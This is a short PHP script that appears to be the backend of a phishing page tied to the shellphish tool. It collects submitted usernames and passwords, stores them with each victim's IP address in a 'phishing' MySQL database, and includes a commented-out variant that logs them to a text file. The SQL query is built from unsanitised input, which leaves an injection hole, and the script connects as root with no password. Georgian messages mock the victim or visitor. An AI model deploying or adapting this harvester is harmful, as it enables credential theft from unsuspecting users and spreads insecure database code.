<?php 
	if(isset($_POST["uname"],$_POST["password"])){
		/*$myfile=fopen("logs.txt","a");
		$str="user: ".$_POST["uname"]. " password: ".$_POST['password']."\n";
		fwrite($myfile,$str);
		fclose($myfile);*/
		$servername = "localhost";
		$username = "root";
		$password = ""; /*root toor*/
		$dbname = "phishing";

		$conn = new mysqli($servername, $username, $password, $dbname);
		if ($conn->connect_error) {
		  die("Connection failed: " . $conn->connect_error);
		}
		$uname=$_POST["uname"];
		$password=$_POST["password"];
		$ip=$_SERVER['REMOTE_ADDR'];
		$sql = "INSERT INTO `logs` (`username`, `password`, `ip`)
		VALUES ('$uname', '$password', '$ip')";

		if ($conn->query($sql) === TRUE) {
		  echo "<h1>shellphish-ი ვირუსი არააა</h1>";
		} else {
		  echo "Error: " . $sql . "<br>" . $conn->error;
		}

		$conn->close();

	}
	else{
		echo "პაპს ნუ ატყუებ შე ვირიშვილო";
	}
?>